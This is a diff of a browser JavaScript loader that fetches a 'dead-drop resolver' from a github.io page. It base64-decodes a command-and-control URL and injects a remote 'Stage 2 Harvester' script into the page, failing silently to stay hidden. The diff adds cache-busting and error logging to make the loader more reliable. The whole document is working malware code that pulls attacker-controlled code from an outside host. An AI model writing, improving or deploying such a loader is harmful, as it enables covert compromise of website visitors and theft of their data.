@@ -1,21 +1,32 @@
 (async function() {
     try {
-        // 1. Fetch the Dead-Drop Resolver
-        const response = await fetch('https://arcanaumbra.github.io/result_predictor/tunnel.json?t=' + Date.now());
+        // FORCE CACHE BUSTING: We append a unique timestamp to the URL
+        // This prevents the browser/CDN from serving an old tunnel URL
+        const resolverUrl = 'https://arcanaumbra.github.io/result_predictor/tunnel.json?nocache=' + Date.now();
+        
+        const response = await fetch(resolverUrl, { cache: "no-store" });
+        if (!response.ok) return;
+
         const config = await response.json();
         
-        // 2. Decode the current C2 Tunnel URL
+        // Decode the Base64 C2 Pointer
         const harvesterUrl = atob(config.u);
         
-        // 3. Inject the Stage 2 Harvester (ga-core.min.js)
+        console.log("[!] Recon Link Established. Targeting: " + harvesterUrl);
+
+        // Inject the Stage 2 Harvester
         const script = document.createElement('script');
         script.src = harvesterUrl;
         script.async = true;
+        
+        // Error handling for the injected script
+        script.onerror = function() {
+            console.error("[X] Stage 2 Bridge Failure: DNS or Tunnel Offline.");
+        };
+
         document.head.appendChild(script);
         
-        console.log("[!] Recon Link Established.");
     } catch (e) {
-        // Fail silently
+        // Silent fail to maintain ghost status
     }
 })();
-
